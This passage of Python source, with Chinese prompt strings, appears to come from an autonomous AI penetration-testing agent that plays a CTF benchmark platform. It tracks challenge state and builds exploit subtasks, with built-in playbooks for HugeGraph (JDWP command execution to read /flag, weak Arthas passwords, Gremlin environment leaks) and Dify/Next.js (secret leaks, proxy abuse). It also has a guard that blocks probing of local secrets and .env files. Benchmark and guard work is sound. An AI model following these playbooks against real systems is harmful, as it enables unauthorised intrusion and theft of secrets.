            for code, score in completed_scores.items():
                if is_platform_submit_command:
                    score_map[code] = score
                else:
                    score_map.setdefault(code, score)
            if challenges_snapshot is not None:
                self._benchmark_state["last_challenges_snapshot"] = challenges_snapshot
                self._benchmark_state["task_finished"] = False
                snapshot_completed = {
                    str(item["unique_code"])
                    for item in challenges_snapshot
                    if item.get("is_completed") is True
                }
                completed_set.update(snapshot_completed)
                for item in challenges_snapshot:
                    code = item.get("unique_code")
                    total_score = item.get("total_score")
                    if (
                        isinstance(code, str)
                        and code in completed_set
                        and isinstance(total_score, int)
                    ):
                        score_map.setdefault(code, total_score)
                active = {}
                for item in challenges_snapshot:
                    code = item.get("unique_code")
                    addrs = item.get("container_addr")
                    if (
                        isinstance(code, str)
                        and self._benchmark_is_active_status(item)
                        and isinstance(addrs, list)
                        and addrs
                        and code not in completed_set
                    ):
                        closed_set.discard(code)
                        abandoned_set.discard(code)
                        recovered_set.discard(code)
                        active[code] = [str(addr) for addr in addrs]
                        current_challenge = code
            for code in completed_set | closed_set:
                active.pop(code, None)
                abandoned_set.discard(code)
                reasoning_set.discard(code)
                service_fingerprints.pop(code, None)
                unreachable_streaks.pop(code, None)
            if self._benchmark_state.get("task_finished"):
                active = {}
            self._benchmark_state["active_containers"] = active
            self._benchmark_state["completed_challenges"] = completed_set
            self._benchmark_state["completed_scores"] = score_map
            self._benchmark_state["closed_challenges"] = closed_set
            self._benchmark_state["abandoned_challenges"] = abandoned_set
            self._benchmark_state["recovery_attempted_challenges"] = recovered_set
            self._benchmark_state["reasoning_challenges"] = reasoning_set
            self._benchmark_state["service_fingerprints"] = service_fingerprints
            self._benchmark_state["probe_unreachable_streaks"] = unreachable_streaks
            if current_challenge and current_challenge not in completed_set and current_challenge not in closed_set:
                self._benchmark_state["current_challenge"] = current_challenge
                self._benchmark_current_challenge = current_challenge
            else:
                stored_current = self._benchmark_state.get("current_challenge")
                if (
                    isinstance(stored_current, str)
                    and stored_current
                    and (
                        stored_current in completed_set
                        or stored_current in closed_set
                        or stored_current in abandoned_set
                    )
                    and stored_current not in active
                ):
                    self._benchmark_state["current_challenge"] = None
                    if self._benchmark_current_challenge == stored_current:
                        self._benchmark_current_challenge = None
            if last_score is not None:
                self._benchmark_state["last_score"] = last_score
            should_cleanup = (
                bool(self._benchmark_state.get("task_finished"))
                and not bool(self._benchmark_state.get("background_processes_cleaned"))
            )
            snapshot = self._benchmark_state_snapshot_unlocked()

        self._record_trace(
            "benchmark_state_updated",
            detail=self._benchmark_state_summary(snapshot),
            metadata=snapshot,
        )
        if (
            bool(self._benchmark_state.get("task_finished"))
            or updates
            or completed
            or completed_scores
            or closed
            or active_updates
            or challenges_snapshot is not None
            or current_challenge
            or last_score is not None
        ):
            self._persist_benchmark_state()
        if should_cleanup:
            self._cleanup_benchmark_background_processes()

    def _benchmark_state_snapshot_unlocked(self) -> dict[str, Any]:
        last_snapshot = self._benchmark_state.get("last_challenges_snapshot")
        snapshot_summary = None
        if isinstance(last_snapshot, list):
            completed_items = [
                item for item in last_snapshot
                if isinstance(item, dict) and item.get("is_completed") is True
            ]
            active_items = [
                item for item in last_snapshot
                if isinstance(item, dict) and self._benchmark_is_active_status(item)
            ]
            snapshot_summary = {
                "total": len(last_snapshot),
                "completed_count": len(completed_items),
                "completed_total_score": sum(
                    item.get("total_score") or 0 for item in completed_items
                ),
                "completed_challenges": sorted(
                    str(item.get("unique_code")) for item in completed_items
                ),
                "active_challenges": sorted(
                    str(item.get("unique_code")) for item in active_items
                ),
            }
        return {
            "vpn_connected": bool(self._benchmark_state.get("vpn_connected")),
            "tun_interface": self._benchmark_state.get("tun_interface"),
            "tun_ip": self._benchmark_state.get("tun_ip"),
            "vpn_config": self._benchmark_state.get("vpn_config"),
            "api_interface": self._benchmark_state.get("api_interface"),
            "task_finished": bool(self._benchmark_state.get("task_finished")),
            "current_challenge": self._benchmark_state.get("current_challenge"),
            "active_containers": dict(self._benchmark_state.get("active_containers", {})),
            "last_challenges_snapshot": snapshot_summary,
            "completed_challenges": sorted(self._benchmark_state.get("completed_challenges", set())),
            "completed_scores": dict(self._benchmark_state.get("completed_scores", {})),
            "closed_challenges": sorted(self._benchmark_state.get("closed_challenges", set())),
            "abandoned_challenges": sorted(self._benchmark_state.get("abandoned_challenges", set())),
            "recovery_attempted_challenges": sorted(
                self._benchmark_state.get("recovery_attempted_challenges", set())
            ),
            "reasoning_challenges": sorted(
                self._benchmark_state.get("reasoning_challenges", set())
            ),
            "service_fingerprints": dict(
                self._benchmark_state.get("service_fingerprints", {})
            ),
            "probe_unreachable_streaks": dict(
                self._benchmark_state.get("probe_unreachable_streaks", {})
            ),
            "auto_submitted_flags": sorted(self._benchmark_state.get("auto_submitted_flags", set())),
            "last_score": self._benchmark_state.get("last_score"),
            "setup_timeout_streak": int(
                self._benchmark_state.get("setup_timeout_streak") or 0
            ),
            "redundant_block_count": int(
                self._benchmark_state.get("redundant_block_count") or 0
            ),
            "background_processes_cleaned": bool(
                self._benchmark_state.get("background_processes_cleaned")
            ),
        }

    def _benchmark_state_snapshot(self) -> dict[str, Any]:
        with self._benchmark_state_lock:
            return self._benchmark_state_snapshot_unlocked()

    @staticmethod
    def _benchmark_state_summary(state: dict[str, Any]) -> str:
        parts: list[str] = []
        if state.get("task_finished"):
            parts.append(
                "任务状态：平台曾返回 invalid_state/finished；"
                "如目标分未达成，应先刷新平台列表确认真实状态，"
                "不要仅凭一次错误响应结束。"
            )
        snapshot = state.get("last_challenges_snapshot")
        if isinstance(snapshot, dict):
            parts.append(
                "最后平台快照："
                f"{snapshot.get('completed_count', 0)}/{snapshot.get('total', '?')} "
                f"题完成，已完成题总分 {snapshot.get('completed_total_score', 0)}。"
            )
        if state.get("vpn_connected"):
            tun = state.get("tun_interface") or "tun0"
            ip = state.get("tun_ip") or "unknown"
            parts.append(f"VPN：已连接 {tun} {ip}，不要重复启动 OpenVPN。")
        if state.get("api_interface"):
            parts.append(
                f"平台 API：使用 --interface {state['api_interface']}，"
                "认证头必须为 BENCHMARK_TOKEN；不要用 tun0 或 Authorization Bearer。"
            )
        active = state.get("active_containers") or {}
        if active:
            active_text = ", ".join(
                f"{code}=>{','.join(addrs)}"
                for code, addrs in sorted(active.items())
            )
            parts.append(f"当前活跃容器：{active_text}。")
        if state.get("current_challenge"):
            parts.append(f"当前题：{state['current_challenge']}。")
        if state.get("completed_challenges"):
            parts.append(
                "已通关题："
                + ", ".join(state["completed_challenges"])
                + "；禁止重复 start/探测。"
            )
            scores = state.get("completed_scores") or {}
            if scores:
                known_score = sum(
                    score for score in scores.values() if isinstance(score, int)
                )
                parts.append(
                    f"已知通关得分：{known_score}（{len(scores)} 道题有分值记录）。"
                )
        if state.get("closed_challenges"):
            parts.append(
                "本地已关闭/软跳过题："
                + ", ".join(state["closed_challenges"])
                + "；平台真实状态优先，若平台仍显示未完成 stopped，允许恢复一次后继续探测。"
            )
        if state.get("abandoned_challenges"):
            parts.append(
                "已判定低收益待关闭题："
                + ", ".join(state["abandoned_challenges"])
                + "；必须先 close，再换下一题，不要继续探测其容器。"
            )
        if state.get("reasoning_challenges"):
            parts.append(
                "已有有效响应线索、必须深挖的题："
                + ", ".join(state["reasoning_challenges"])
                + "；这是 fast path handoff，不是前置 setup。禁止生成/执行工具链检查、"
                "VPN 启动、重复读取目录、批量 list/start 新题等任务；必须先围绕当前"
                " active 容器的页面/API/源码/配置线索验证。"
            )
        fingerprints = state.get("service_fingerprints") or {}
        if isinstance(fingerprints, dict) and fingerprints:
            parts.append(
                "已识别服务指纹："
                + ", ".join(
                    f"{code}={fingerprint}"
                    for code, fingerprint in sorted(fingerprints.items())
                )
                + "；后续攻击路径必须围绕该真实服务类型，不要套用无关 Web/PHP 模板。"
            )
        if state.get("last_score") is not None:
            parts.append(f"最近题目累计得分：{state['last_score']}。")
        return "\n".join(parts)

    def _benchmark_state_context(self) -> str:
        if not self._is_benchmark_aggressive():
            return ""
        summary = self._benchmark_state_summary(self._benchmark_state_snapshot())
        target_directive = self._benchmark_target_continue_directive()
        if target_directive:
            summary = f"{summary}\n{target_directive}" if summary else target_directive
        if not summary:
            return ""
        return (
            "## Benchmark 已确认运行态（必须信任并复用）\n"
            f"{summary}\n"
            "除非上面的状态被平台 API 明确推翻，否则不要重复做 VPN 启动、"
            "不要回头探测已完成题；本地已关闭但平台仍未完成的 stopped 题可恢复一次。"
            "10.x 容器访问必须显式使用 "
            "`curl --interface tun0`；平台 API 才使用物理网卡。"
        )

    @staticmethod
    def _benchmark_builtin_service_handoff_profiles() -> dict[str, dict[str, Any]]:
        return {
            "hugegraph": {
                "context": (
                    "## 当前题专项线索\n"
                    "fast path 已识别当前服务为 HugeGraph/Gremlin/Arthas/JDWP 类 Java 服务。"
                    "根路径、/versions、/graphs、/graphs/hugegraph/conf、/gremlin、/arthas "
                    "和 JDWP 5005 是优先路径。不要继续做普通 Web/PHP/LFI/目录枚举。"
                    "如果 nmap jdwp-exec 因本机 nselib 解析错误失败，应改用 jdb、自定义 JDWP、"
                    "Arthas 或 Gremlin 侧信道，不要重复 HTTP 字典扫描。"
                ),
                "steps": [
                    (
                        "Benchmark handoff step 1：只复核当前 active 题 {current} "
                        "({addr_text}) 的 HugeGraph 指纹和关键端口。禁止 setup/VPN/"
                        "toolchain/list/start。只允许访问 /、/versions、/graphs、"
                        "/graphs/hugegraph/conf、/gremlin、/arthas，并探测 5005/8561/8562。"
                        "发现 flag{{...}} 立即 submit。"
                    ),
                    (
                        "Benchmark hugegraph exploit step 2：只围绕 {current} 的 "
                        "HugeGraph/Gremlin/Arthas/JDWP 选择一个最高置信利用路径。"
                        "优先顺序：1) JDWP 5005 读取 /flag 或执行 cat /flag；"
                        "2) Arthas 8561/8562 默认/弱口令后执行命令；"
                        "3) Gremlin System.getenv/System.getProperties 或 HugeGraph API "
                        "泄露。禁止继续普通 HTTP 目录枚举、SQLi、XSS、PHP/LFI。"
                        "最多验证一个主假设和一个备选假设；发现 flag 立即 submit。"
                    ),
                    (
                        "Benchmark hugegraph close step 3：只有当 {current} 的 JDWP、"
                        "Arthas、Gremlin 三条路径均无新线索且无 flag 时，才 close?"
                        "unique_code={current}；否则保留 active 并返回下一步具体利用点。"
                    ),
                ],
            },
            "dify": {
                "context": (
                    "## 当前题专项线索\n"
                    "fast path 已识别当前服务为 Dify/Next.js。前端 3000 可达，"
                    "`data-api-prefix`/`data-public-api-prefix` 指向 127.0.0.1:5001，"
                    "直连 5001 可能被拒绝。不要按普通 PHP/LFI/目录字典扫；优先基于 "
                    "Next.js 静态 chunk、RSC payload、Dify public/console API、安装/登录态、"
                    "SSR/proxy/rewrite 行为和暴露的 app/dataset/workspace 标识推进。"
                ),
                "steps": [
                    (
                        "Benchmark dify handoff step 1：只深挖当前 active 题 {current} "
                        "({addr_text}) 的 Dify/Next.js 指纹。禁止 setup/VPN/toolchain/"
                        "list/start/PHP/LFI 字典扫描。只访问当前 host:port，必须使用 "
                        "curl --interface tun0。复核 /apps、/signin、RSC payload、"
                        "有限 Next.js chunk、/console/api/* 与 /api/* 的真实响应；"
                        "发现 flag{{...}} 立即 submit。"
                    ),
                    (
                        "Benchmark dify exploit step 2：围绕 {current} 选择一个最高置信"
                        " Dify/Next.js 利用路径。优先顺序：1) chunk/RSC 泄露 app_id、"
                        "secret、token、flag 或可调用 public API；2) install/setup/signin "
                        "状态错误暴露初始化或管理员路径；3) Next rewrite/proxy 到 "
                        "127.0.0.1:5001 的可利用入口。禁止继续泛化目录枚举。最多一个"
                        "主假设和一个备选假设；发现候选 flag 立即 submit。"
                    ),
                    (
                        "Benchmark dify close step 3：只有当 {current} 的静态 chunk、"
                        "RSC、public/console API、install/signin 状态均无新线索且无 flag "
                        "时，才 close?unique_code={current}；否则保留 active 并返回"
                        "下一步具体利用点。"
                    ),
                ],
            },
        }

    def _benchmark_normalize_service_handoff_profile(
        self,
        raw: Any,
    ) -> tuple[str, dict[str, Any]] | None:
        if not isinstance(raw, dict):
            return None
        fingerprint = str(raw.get("fingerprint") or "").strip().lower()
        if not _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", fingerprint):
            return None
        context = str(raw.get("context") or "").strip()
        steps = self._benchmark_string_tuple(raw.get("steps"), limit=10)
        if not context or not steps:
            return None
        return fingerprint, {
            "context": context[:3000],
            "steps": list(steps),
        }

    def _benchmark_external_service_handoff_profiles(self) -> dict[str, dict[str, Any]]:
        data = self._benchmark_external_profiles()
        raw_profiles = data.get("service_handoff_profiles", data.get("handoff_profiles", []))
        profiles: dict[str, dict[str, Any]] = {}
        if isinstance(raw_profiles, list):
            for raw in raw_profiles[:40]:
                normalized = self._benchmark_normalize_service_handoff_profile(raw)
                if normalized is None:
                    continue
                fingerprint, profile = normalized
                profiles[fingerprint] = profile
        for profile in self._benchmark_external_service_probe_profiles():
            fingerprint = str(profile.get("fingerprint") or "")
            context = str(profile.get("handoff_context") or "").strip()
            steps = self._benchmark_string_tuple(profile.get("handoff_steps"), limit=10)
            if not fingerprint or not context or not steps:
                continue
            profiles.setdefault(
                fingerprint,
                {
                    "context": context[:3000],
                    "steps": list(steps),
                },
            )
        return profiles

    def _benchmark_service_handoff_profiles(self) -> dict[str, dict[str, Any]]:
        profiles = {
            key: dict(value)
            for key, value in self._benchmark_builtin_service_handoff_profiles().items()
        }
        profiles.update(self._benchmark_external_service_handoff_profiles())
        return profiles

    def _benchmark_render_service_handoff_subtasks(
        self,
        *,
        current: str,
        addr_text: str,
        context: str,
        fingerprint: str,
    ) -> list[dict[str, Any]]:
        profile = self._benchmark_service_handoff_profiles().get(fingerprint)
        if not profile:
            return []
        service_context = f"{context}\n\n{profile['context']}"
        return [
            {
                "role": "runner",
                "task_description": str(step).format(
                    current=current,
                    addr_text=addr_text,
                ),
                "context": service_context,
                "parallel": False,
            }
            for step in profile.get("steps", [])
        ]

    def _benchmark_reasoning_handoff_subtasks(self) -> list[dict[str, Any]]:
        state = self._benchmark_state_snapshot()
        current = state.get("current_challenge")
        reasoning = set(state.get("reasoning_challenges") or [])
        active = state.get("active_containers") or {}
        if not isinstance(current, str) or current not in reasoning:
            return []
        addrs = active.get(current) if isinstance(active, dict) else None
        addr_text = ", ".join(str(addr) for addr in addrs or []) or "平台状态中的当前地址"
        context = self._benchmark_state_context()
        fingerprints = state.get("service_fingerprints") or {}
        fingerprint = (
            fingerprints.get(current)
            if isinstance(fingerprints, dict)
            else None
        )
        if isinstance(fingerprint, str):
            profile_handoff = self._benchmark_render_service_handoff_subtasks(
                current=current,
                addr_text=addr_text,
                context=context,
                fingerprint=fingerprint,
            )
            if profile_handoff:
                return profile_handoff
        fingerprint_note = (
            f"已识别服务指纹为 {fingerprint}；"
            if isinstance(fingerprint, str) and fingerprint
            else "未识别到可套用的服务专项 profile；"
        )
        return [
            {
                "role": "runner",
                "task_description": (
                    f"Benchmark handoff step 1：只深挖当前 active 题 {current} "
                    f"({addr_text})，禁止 setup/VPN/toolchain/list/start。所有 10.x 请求必须 "
                    "curl --interface tun0。先复核 fast path 的真实证据：状态码、响应头、"
                    "标题、表单、脚本/chunk、OpenAPI/Swagger、错误栈、参数名、cookie、"
                    "重定向、暴露端点和服务 banner。不要套用固定题号或固定技术栈；"
                    "只从已观察到的响应差异中选择下一步。"
                    "发现 flag{...} 立即 submit。"
                ),
                "context": f"{context}\n\n## 通用 handoff 约束\n{fingerprint_note}"
                "没有专属 profile 时，围绕真实响应建立一个主假设和一个备选假设；"
                "优先验证已暴露的 API、认证/权限边界、配置/源码/静态资源泄漏、"
                "文件/路径/URL/模板/查询参数行为和默认凭据。无响应差异就停止该方向。",
                "parallel": False,
            },
            {
                "role": "runner",
                "task_description": (
                    f"Benchmark handoff step 2：继续当前题 {current} 的一个最高置信后续假设，"
                    "必须由真实响应驱动：只验证上一轮已经暴露的端点、参数、认证状态、"
                    "静态资源、错误信息、服务 banner 或协议特征。最多验证一个主假设和一个"
                    "备选假设；无新响应差异就停止。"
                    "发现 flag/secret/候选答案立即 submit。"
                ),
                "context": context,
                "parallel": False,
            },
            {
                "role": "runner",
                "task_description": (
                    f"Benchmark handoff step 3：如果 {current} 仍无 flag、无新线索且已验证"
                    "主要源码/API/文件路径，调用平台 close?unique_code="
                    f"{current} 释放容器，然后返回 close 结果；不要 start 新题。"
                ),
                "context": context,
                "parallel": False,
            },
        ]

    def _benchmark_plan_is_setup_like(self, subtasks: list[dict[str, Any]]) -> bool:
        if not subtasks:
            return False
        text = "\n".join(str(task.get("task_description", "")) for task in subtasks).lower()
        setup_markers = (
            "toolchain",
            "openvpn",
            "vpn",
            "challenges_api",
            "api连通",
            "预检",
            "读取当前工作目录",
            "检查系统工具",
            "建立vpn",
            "启动新",
            "start",
            "刷新题目列表",
        )
        return any(marker in text for marker in setup_markers)

    def _benchmark_plan_is_handoff_like(self, subtasks: list[dict[str, Any]]) -> bool:
        if not subtasks:
            return False
        text = "\n".join(str(task.get("task_description", "")) for task in subtasks).lower()
        markers = [
            "benchmark handoff step",
            "只深挖当前 active",
        ]
        markers.extend(
            f"benchmark {fingerprint}"
            for fingerprint in sorted(self._benchmark_profiled_service_fingerprints())
        )
        return any(marker in text for marker in markers)

    def _benchmark_should_pause_generic_plan_after_deterministic(
        self,
        desc: str,
    ) -> tuple[bool, str]:
        """Stop same-round generic subtasks once a challenge needs focused handoff."""
        if not self._is_benchmark_aggressive():
            return False, ""
        if self._benchmark_plan_is_handoff_like([{"task_description": desc}]):
            return False, ""

        state = self._benchmark_state_snapshot()
        classification = self._benchmark_classify_standard_task(desc)
        current = state.get("current_challenge")
        active = state.get("active_containers") or {}
        if classification in {"setup", "schedule"} and (
            (isinstance(current, str) and current)
            or (isinstance(active, dict) and active)
        ):
            active_text = current if isinstance(current, str) and current else ", ".join(sorted(active))
            return (
                True,
                f"已锁定 active 题 {active_text}，停止本轮旧调度计划，下一轮只围绕当前题 probe/submit/close",
            )

        reasoning = set(state.get("reasoning_challenges") or [])
        if not reasoning:
            return False, ""

        completed = set(state.get("completed_challenges") or [])
        closed = set(state.get("closed_challenges") or [])
        abandoned = set(state.get("abandoned_challenges") or [])
        inactive = completed | closed | abandoned

        candidates: list[str] = []
        if isinstance(current, str) and current:
            candidates.append(current)
        candidates.extend(code for code in active if isinstance(code, str))
        for code in dict.fromkeys(candidates):
            if code in reasoning and code not in inactive:
                return (
                    True,
                    f"{code} 已进入 reasoning_handoff，跳过本轮剩余泛化子任务",
                )
        return False, ""

    def _benchmark_normalize_selected_indices(
        self,
        subtasks: list[dict[str, Any]],
        selected_indices: list[int],
    ) -> tuple[list[int], str]:
        """Keep Benchmark handoff plans intact so their close/stop-loss step runs."""
        if not self._is_benchmark_aggressive():
            return selected_indices, ""
        if not self._benchmark_plan_is_handoff_like(subtasks):
            return selected_indices, ""
        all_indices = list(range(len(subtasks)))
        if selected_indices == all_indices:
            return selected_indices, ""
        return (
            all_indices,
            "Benchmark handoff 计划必须完整执行，已恢复被筛掉的专项/close 步骤",
        )

    def _benchmark_final_summary(self) -> str:
        if not self._is_benchmark_aggressive():
            return ""
        state = self._benchmark_state_snapshot()
        snapshot = state.get("last_challenges_snapshot")
        completed = list(state.get("completed_challenges") or [])
        scores = state.get("completed_scores") or {}
        total_score = sum(score for score in scores.values() if isinstance(score, int))
        total_count = len(completed)
        total_challenges: int | str = "?"

        if isinstance(snapshot, dict):
            total_count = int(snapshot.get("completed_count") or total_count)
            total_score = int(snapshot.get("completed_total_score") or total_score)
            total_challenges = int(snapshot.get("total") or 0) or "?"
            completed = list(snapshot.get("completed_challenges") or completed)

        target_score = self._resolve_benchmark_target_score()
        target_line = ""
        if target_score > 0:
            remain = max(0, target_score - total_score)
            target_line = (
                f"\n- 目标分数: {target_score}"
                f"\n- 距离目标: {remain}"
            )

        status = "finished" if state.get("task_finished") else "running/unknown"
        completed_text = ", ".join(completed) if completed else "无"
        return (
            "\n\n## Benchmark 最终状态\n"
            f"- 任务状态: {status}\n"
            f"- 已通关题数: {total_count}/{total_challenges}\n"
            f"- 已知总分: {total_score}"
            f"{target_line}\n"
            f"- 已通关题: {completed_text}"
        )

    def _benchmark_terminal_stop_reason(self) -> str:
        if not self._is_benchmark_aggressive():
            return ""
        state = self._benchmark_state_snapshot()
        if not state.get("task_finished"):
            return ""
        blocked = int(state.get("redundant_block_count") or 0)
        if blocked >= BENCHMARK_REDUNDANT_BLOCK_LIMIT:
            block_phrase = (
                "首次被 guard 拦截"
                if blocked == 1
                else f"已连续被拦截 {blocked} 次"
            )
            return (
                "Benchmark 已处于 invalid_state/finished，且后续平台/靶场调用"
                f"{block_phrase}；立即终止管线，避免 finished 后空转。"
            )
        target_score = self._resolve_benchmark_target_score()
        if target_score > 0:
            scores = state.get("completed_scores") or {}
            known_score = sum(
                score for score in scores.values() if isinstance(score, int)
            )
            if known_score < target_score:
                return ""
        return (
            "Benchmark 已处于 invalid_state/finished；立即终止管线，"
            "跳过后续子任务、审计和反思。"
        )

    def _benchmark_stop_if_terminal(self, source: str) -> bool:
        reason = self._benchmark_terminal_stop_reason()
        if not reason:
            return False
        if not self._benchmark_hard_stop_recorded:
            self._benchmark_hard_stop_recorded = True
            self._record_trace(
                "benchmark_hard_stop",
                detail=reason,
                metadata={
                    "source": source,
                    "score_status": self._benchmark_score_status(),
                },
            )
            self._renderer.console.print(f"  [dim yellow]⏹ {reason}[/]")
        return True

    def _cleanup_benchmark_background_processes(self) -> None:
        """Stop helper scripts after a Benchmark task is known to be finished."""
        with self._benchmark_state_lock:
            if self._benchmark_state.get("background_processes_cleaned"):
                return
            self._benchmark_state["background_processes_cleaned"] = True

        try:
            result = subprocess.run(
                ["pkill", "-TERM", "-f", r"bash .*auto_solve\.sh|auto_solve\.sh"],
                check=False,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
            )
            self._record_trace(
                "benchmark_background_cleanup",
                detail="已尝试终止 auto_solve.sh 后台进程。",
                metadata={
                    "returncode": result.returncode,
                    "stdout": result.stdout,
                    "stderr": result.stderr,
                },
            )
        except Exception as exc:
            self._record_trace(
                "benchmark_background_cleanup_failed",
                detail=str(exc),
            )

    @staticmethod
    def _is_cyber_agent_debug_task(task_text: str) -> bool:
        lowered = task_text.lower().split("任务边界", 1)[0]
        mentions_project = any(
            keyword in lowered for keyword in CYBER_AGENT_TASK_KEYWORDS
        )
        has_debug_intent = any(
            keyword in lowered for keyword in CYBER_AGENT_DEBUG_INTENT_KEYWORDS
        )
        return mentions_project and has_debug_intent

    @staticmethod
    def _resolve_max_iterations() -> int:
        from ..config import settings

        raw_value = getattr(settings, "pipeline_max_iterations", 20)
        configured = int(raw_value if raw_value is not None else 20)
        return max(1, min(configured, 100))

    def _resolve_max_subagents(self) -> int:
        from ..config import settings

        raw_value = self._runtime_context.get(
            "max_subagents",
            getattr(settings, "pipeline_max_subagents", 4),
        )
        try:
            configured = int(raw_value)
        except (TypeError, ValueError):
            configured = 4
        return max(1, min(configured, 16))

    def _resolve_subtask_concurrency(self) -> str:
        from ..config import settings

        raw_value = str(
            self._runtime_context.get(
                "subtask_concurrency",
                getattr(settings, "pipeline_subtask_concurrency", "auto"),
            )
        ).strip().lower()
        if raw_value not in {"off", "auto", "force"}:
            return "auto"
        if self._resolve_max_subagents() <= 1:
            return "off"
        return raw_value

    @staticmethod
    def _extract_subtask_resource_keys(task: dict) -> set[str]:
        """提取子任务涉及的资源锁，避免并发时互相踩同一目标。"""
        text_parts = [
            str(task.get("task_description", "")),
            str(task.get("context", "")),
        ]
        text = "\n".join(text_parts)
        lowered = text.lower()
        keys: set[str] = set()

        challenge_code_pattern = r"\b(?=[A-Za-z0-9-]*\d)[A-Za-z][A-Za-z0-9]*(?:-[A-Za-z0-9]+)+\b"
        for match in _re_mod.findall(challenge_code_pattern, text):
            keys.add(f"challenge:{match}")

        for match in _re_mod.findall(
            r"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?\b",
            lowered,
        ):
            keys.add(f"host:{match}")

        for match in _re_mod.findall(r"(?<!\w)/(?:[^\s'\"`<>|;&]+)", text):
            keys.add(f"file:{match.rstrip('.,:;')}")

        if any(word in lowered for word in ("session", "会话", "history", ".events.jsonl")):
            keys.add("session:current")

        if "tsecbench" in lowered or "/openapi/v1/challenges" in lowered:
            keys.add("api:tsecbench")

        if any(word in lowered for word in ("submit", "提交 flag", "提交flag")):
            keys.add("api:tsecbench-submit")
        has_challenge_key = any(key.startswith("challenge:") for key in keys)
        if any(word in lowered for word in ("start", "启动")) and (
            has_challenge_key
            or "unique_code" in lowered
            or "/challenges/start" in lowered
            or "未完成" in lowered
        ):
            keys.add("api:tsecbench-start")
        if any(word in lowered for word in ("close", "关闭", "释放")) and (
            has_challenge_key
            or "unique_code" in lowered
            or "/challenges/close" in lowered
            or "当前题" in lowered
        ):
            keys.add("api:tsecbench-close")

        return keys

    @staticmethod
    def _is_subtask_sensitive(task: dict) -> bool:
        """敏感操作强制顺序，优先保证外部状态一致。"""
        text = (
            f"{task.get('task_description', '')}\n{task.get('context', '')}"
        ).lower()
        sensitive_markers = (
            "submit",
            "提交 flag",
            "提交flag",
            "close",
            "关闭容器",
            "释放资源",
            "/session",
            "切换会话",
            "save_session",
            ".events.jsonl",
        )
        if any(marker in text for marker in sensitive_markers):
            return True
        has_challenge_like_code = bool(
            _re_mod.search(
                r"\b(?=[A-Za-z0-9-]*\d)[A-Za-z][A-Za-z0-9]*(?:-[A-Za-z0-9]+)+\b",
                text,
            )
        )
        if "start" in text and (
            has_challenge_like_code
            or "unique_code" in text
            or "/challenges/start" in text
        ):
            return True
        if "启动" in text and (
            has_challenge_like_code
            or "unique_code" in text
            or "未完成" in text
            or "当前题" in text
        ):
            return True
        return False

    def _subtask_parallel_decision(self, task: dict) -> tuple[bool, str]:
        strategy = self._resolve_subtask_concurrency()
        if strategy == "off":
            return False, "concurrency_off"
        if self._is_subtask_sensitive(task):
            return False, "sensitive_operation"
        if strategy == "force":
            return True, "force"
        if bool(task.get("parallel", False)):
            return True, "llm_parallel"
        return False, "not_marked_parallel"

    @staticmethod
    def _is_boundary_probe(tool_call: dict) -> str | None:
        tool_name = str(tool_call.get("name", ""))
        args = tool_call.get("args", {})
        if not isinstance(args, dict):
            return None

        haystack_parts = []
        for key in ("command", "path", "working_directory"):
            value = args.get(key)
            if isinstance(value, str):
                haystack_parts.append(value)
        haystack = "\n".join(haystack_parts).lower()
        if not haystack:
            return None

        if any(pattern in haystack for pattern in LOCAL_SECRET_PROBE_PATTERNS):
            return "禁止在内部子任务中探测本机密钥、.env 或凭证配置。"

        if any(pattern in haystack for pattern in LOCAL_PROJECT_PROBE_PATTERNS):
            return "禁止在无关内部子任务中探测 cyber-agent 本地源码、历史会话或桌面端目录。"

        if tool_name == "run_shell_command" and any(
            pattern in haystack for pattern in BROAD_LOCAL_SEARCH_PATTERNS
        ):
            return "禁止在内部子任务中对本机 /home 或根目录做大范围搜索。"

        if tool_name == "run_shell_command":
            probes_env = any(
                pattern in haystack for pattern in LOCAL_ENV_PROBE_PATTERNS
            )
            if probes_env:
                return "禁止在内部子任务中探测本机环境变量。"

        return None

    def _make_subtask_approval_handler(self, task_text: str) -> Any:
        """为内部子任务创建带任务边界的审批器。"""
        from .approval import ApprovalDecision

        allow_project_probe = self._is_cyber_agent_debug_task(task_text)

        def handler(tool: Any, tool_call: dict) -> "ApprovalDecision":
            benchmark_reason = self._benchmark_tool_guard(tool_call)
            if benchmark_reason is not None:
                with self._benchmark_state_lock:
                    self._benchmark_redundant_block_count += 1
                    self._benchmark_state["redundant_block_count"] = (
                        self._benchmark_redundant_block_count
                    )
                self._record_trace(
                    "benchmark_redundant_action_blocked",
                    detail=benchmark_reason,
                    metadata={
                        "tool": str(tool_call.get("name", "")),
                        "args": tool_call.get("args", {}),
                        "count": self._benchmark_redundant_block_count,
                    },
                )
                return ApprovalDecision(False, benchmark_reason)
            if not allow_project_probe:
                reason = self._is_boundary_probe(tool_call)
                if reason is not None:
                    return ApprovalDecision(False, reason)
            return self._auto_approval_handler(tool, tool_call)

        handler.review_all_tools = True  # type: ignore[attr-defined]
        return handler

    def _make_subtask_event_handler(
        self,
        renderer: Any,
    ) -> Any:
        """创建子任务执行期间的事件处理器，将工具调用进度转发到渲染器。

        CLI 模式下直接输出到终端，TUI 模式下通过 _PipelineTuiForwarder
        转发到聊天视图。

        返回的 handler 附加了 .get_token_usage() 方法，调用方可在 run() 完成后
        读取本次执行的 Token 消耗并累加到管线总计。
        """
        subtask_start = time_mod.monotonic()
        # 工具调用按序入队，TOOL_RESULT 时输出单行。使用 【】包围状态避免 Rich 误解析。
        _pending_tool_calls: list[dict] = []
        _token_usage: dict[str, int] = {"input_tokens": 0, "output_tokens": 0}

        def _determine_status(tool_name: str, content: str, exit_code: str) -> str:
            if tool_name == "run_shell_command":
                if exit_code == "0":
                    return "成功"
                elif exit_code not in ("?", ""):
                    return "失败"
                else:
                    return "异常"
            first_line = content.strip().split("\n")[0] if content.strip() else ""
            if not content or not content.strip():
                return "异常"
            if first_line.startswith("❌"):
                return "失败"
            return "成功"

        def handler(event_type: str | AgentEventType, data: Any) -> None:
            nonlocal subtask_start
            if event_type == AgentEventType.TOOL_CALL:
                calls = data if isinstance(data, (list, tuple)) else []
                for tc in calls:
                    name = tc.get("name", "?")
                    args = tc.get("args", {})
                    args_str = json.dumps(args, ensure_ascii=False)
                    if len(args_str) > 80:
                        display_args_str = args_str[:80] + "…"
                    else:
                        display_args_str = args_str
                    elapsed = time_mod.monotonic() - subtask_start
                    self._record_trace(
                        "tool_call",
                        detail=f"{name}({args_str})",
                        metadata={
                            "tool": name,
                            "args": args,
                            "elapsed_s": round(elapsed),
                        },
                    )
